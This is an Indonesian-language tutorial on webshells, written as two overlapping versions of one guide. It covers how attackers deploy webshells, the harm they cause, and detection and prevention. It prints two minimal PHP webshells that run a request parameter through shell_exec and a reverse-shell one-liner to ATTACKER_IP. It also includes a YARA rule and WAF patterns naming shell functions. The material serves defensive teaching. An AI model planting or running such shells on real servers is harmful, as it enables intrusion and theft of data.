# Apa-itu-webshell

### 🌐 Apa Itu Webshell?

**Webshell** adalah skrip berbasis web (biasanya ditulis dalam bahasa seperti PHP, ASP, JSP, Python, atau Node.js) yang memungkinkan penyerang mendapatkan akses *remote command execution* ke server melalui antarmuka web (HTTP/HTTPS).  

Secara sederhana, webshell adalah *backdoor* yang diunggah ke server web yang rentan, sehingga penyerang bisa menjalankan perintah sistem operasi (seperti `ls`, `cat`, `whoami`, `rm`, bahkan menginstal malware) langsung dari browser atau alat seperti `curl`.

---

### 🔧 Cara Kerja Webshell

1. **Eksploitasi Kerentanan**:  
   Penyerang memanfaatkan celah keamanan seperti:
   - Upload file tanpa validasi (misal: form upload gambar yang bisa diisi file `.php`)
   - Remote File Inclusion (RFI)
   - Local File Inclusion (LFI) + log poisoning
   - SQLi ke RCE (Remote Code Execution) → upload webshell
   - Eksploitasi CMS/plugin yang tidak di-*patch*

2. **Upload/Deploy Webshell**:  
   File webshell diunggah ke direktori web yang dapat dieksekusi (misal: `/var/www/html/shell.php`).

3. **Akses Interaktif**:  
   Penyerang mengakses webshell via URL (misal: `https://target.com/shell.php`) dan mendapatkan antarmuka:
   - CLI-like (form input untuk perintah)
   - GUI sederhana (file manager, terminal emulator, dll.)
   - Tersembunyi (misal: hanya merespons jika header tertentu dikirim)

---

### 📄 Contoh Sederhana Webshell (PHP)

⚠️ **Hanya untuk edukasi dan pengujian legal (dengan izin)**.

```php
<!-- simple-shell.php -->
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Akses:  
`https://example.com/simple-shell.php?cmd=whoami`

> Catatan: Webshell nyata biasanya lebih canggih — mengenkripsi input/output, menggunakan password, menyamarkan diri sebagai file biasa (misal: `image.jpg.php`), atau memanfaatkan teknik *obfuscation*.

---

### 🛡️ Jenis-Jenis Webshell

| Jenis | Deskripsi |
|-------|-----------|
| **Reverse Shell** | Webshell membuka koneksi balik ke penyerang (misal: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`) |
| **Bind Shell** | Webshell membuka port di server korban, menunggu koneksi dari penyerang |
| **Obfuscated Shell** | Kode diacak/minimalkan/dienkripsi untuk menghindari deteksi AV/WAF |
| **GUI Webshell** | Memiliki antarmuka seperti file manager, database explorer (contoh: *China Chopper*, *b374k*, *C99*) |

---

### 🚨 Dampak Bahaya

- Akses penuh ke server (root/admin jika privilege escalation berhasil)
- Pencurian data sensitif (database, file config, kredensial)
- Penggunaan server sebagai *proxy* atau *botnet node*
- Deface website
- Deploy ransomware atau cryptominer

---

### 🔍 Cara Mendeteksi Webshell

1. **File Integrity Monitoring (FIM)**  
   Bandingkan checksum file dengan baseline.
2. **Analisis Log Web**  
   Cari pola mencurigakan:  
   - Request ke file `.php` acak dengan ekstensi tidak biasa  
   - Parameter `cmd=`, `exec=`, `a=` secara berulang  
   - User-agent mencurigakan  
3. **Signature-based Detection**  
   Gunakan tools seperti:
   - [LMD (Linux Malware Detect)](https://www.rfxn.com/projects/linux-malware-detect/)
   - ClamAV + custom signature
   - YARA rules
4. **Behavioral Analysis**  
   Proses web (misal `apache2`) yang tiba-tiba membuka koneksi jaringan eksternal → tanda reverse shell.

---

### ✅ Pencegahan

- Validasi & sanitasi *file upload* (cek ekstensi, MIME type, *content sniffing*)
- Nonaktifkan eksekusi PHP di direktori upload (`.htaccess`: `php_flag engine off`)
- Gunakan WAF (Web Application Firewall) dengan rules anti-webshell
- Batasi permission file/direktori (`chmod 644` untuk file, `755` untuk direktori; hindari `777`)
- Update rutin CMS, plugin, dan server
- Gunakan *least privilege* untuk user web server
- Audit kode secara berkala (SAST/DAST)

---

### 📚 Referensi & Tools

- [OWASP Webshells](https://owasp.org/www-community/attacks/Web_Shells)
- [PayloadsAllTheThings – Webshells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Webshells)
- [b374k PHP Webshell](https://github.com/b374k/b374k) (untuk analisis & pembelajaran)
- [Web Shell Detection with YARA](https://github.com/Yara-Rules/rules/blob/master/malware/webshells_index.yar)

# 🕵️ Webshell — Definisi, Mekanisme, & Pertahanan

> ⚠️ **Catatan Edukasi**: Dokumen ini bertujuan untuk pembelajaran keamanan siber (*ethical hacking*, *blue teaming*, dan *incident response*). Penggunaan webshell tanpa izin adalah **ilegal** dan melanggar UU ITE serta hukum internasional.

---

## 📌 Apa Itu Webshell?

**Webshell** adalah skrip berbasis web (misalnya PHP, ASP, JSP, Python) yang diunggah ke server dan memungkinkan penyerang mengeksekusi perintah sistem secara *remote* melalui protokol HTTP/HTTPS.

Bayangkan: sebuah terminal/command prompt yang diakses lewat browser — itulah inti webshell.

---

## 🔧 Cara Kerja

1. **Eksploitasi**  
   Penyerang memanfaatkan kerentanan seperti:
   - Upload file tanpa validasi
   - Remote/LFI (File Inclusion)
   - SQL Injection → RCE
   - CMS/plugin usang

2. **Upload & Eksekusi**  
   File webshell diunggah ke direktori web yang bisa dieksekusi, lalu diakses via URL.

3. **Kontrol Penuh**  
   Penyerang menjalankan perintah sistem:  
   ```bash
   whoami, ls -la, cat /etc/passwd, wget malware, ...

    ## 📄 Contoh Sederhana (PHP)

```php
<!-- simple-shell.php -->
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST['cmd'])) . "</pre>";
}
?>
```

Akses via:  
`https://target.com/simple-shell.php?cmd=id`

> 🔒 **Best Practice**: Jangan pernah izinkan eksekusi perintah dari input pengguna di aplikasi produksi!

---

## 🧩 Jenis Webshell

| Jenis | Deskripsi |
|------|-----------|
| **Reverse Shell** | Server korban menghubungi penyerang (lebih sulit dideteksi firewall) |
| **Bind Shell** | Server membuka port & menunggu koneksi dari luar |
| **Obfuscated** | Kode dienkripsi/minified (misal: base64, `eval(gzinflate(...))`) |
| **GUI-based** | Antarmuka lengkap: file manager, DB explorer, port scanner (contoh: *C99*, *b374k*) |

---

## 🚨 Dampak Bahaya

- ☠️ Akses root / admin ke server  
- 📦 Pencurian database, kredensial, & file sensitif  
- 🤖 Server dijadikan botnet / proxy / C2 node  
- 💰 Deploy ransomware atau cryptominer  
- 🌐 Deface atau redirect ke phishing

---

## 🔍 Deteksi Webshell

### 📁 File & Kode
- Cari file mencurigakan:  
  `find /var/www -name "*.php" -mtime -7`  
  `grep -r "shell_exec\|system\|passthru\|eval(" /var/www`

### 📊 Log Analisis (Apache/Nginx)
Cari pola:
```
GET /uploads/shell.php?cmd=id
POST /backup.zip.php (ekstensi ganda)
User-Agent: Mozilla/5.0 (compatible; b374k)
```

### 🛠 Tools Deteksi
| Tool | Fungsi |
|------|--------|
| **LMD** | Scan malware di Linux |
| **ClamAV + custom sig** | Antivirus + signature webshell |
| **YARA** | Deteksi berbasis pola kode (lihat contoh di bawah) |
| **Wazuh / OSSEC** | HIDS dengan rules webshell |

#### Contoh YARA Rule (Sederhana)
```yara
rule Simple_PHP_Webshell {
    meta:
        description = "Detect basic PHP webshell patterns"
        author = "Sadewo"
    strings:
        $s1 = /eval\(/ nocase
        $s2 = /shell_exec\(/ nocase
        $s3 = /system\(/ nocase
        $s4 = /\$_(GET|POST|REQUEST)\[.*\]/ nocase
    condition:
        2 of ($s1, $s2, $s3, $s4) and filename matches /\.php$/
}
```

---

## ✅ Pencegahan & Mitigasi

| Tindakan | Penjelasan |
|---------|------------|
| ✅ **Validasi Upload File** | Cek ekstensi, MIME type, *magic number*, simpan di luar `DocumentRoot` |
| ✅ **Nonaktifkan Eksekusi di Direktori Upload** | `.htaccess`: `php_flag engine off` atau `deny from all` |
| ✅ **WAF Rules** | Blokir permintaan dengan `cmd=`, `exec=`, `passthru`, dll. |
| ✅ **Least Privilege** | User web (e.g. `www-data`) tidak boleh bisa `sudo` atau akses `/etc/shadow` |
| ✅ **Update & Patch** | CMS, framework, OS, PHP — selalu terbaru |
| ✅ **File Integrity Monitoring (FIM)** | Monitor perubahan file via AIDE, Tripwire, atau Wazuh |

---

## 📚 Referensi & Resources

- [OWASP: Web Shells](https://owasp.org/www-community/attacks/Web_Shells)  
- [PayloadsAllTheThings — Webshells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Webshells)  
- [YARA Rules for Webshells](https://github.com/Yara-Rules/rules/blob/master/malware/webshells_index.yar)  
- [MITRE ATT&CK: T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)

> 🔐 *"Prevention is ideal, but detection is mandatory."*

---

© 2025 — Dokumentasi oleh Sadewo | Untuk pembelajaran keamanan siber.
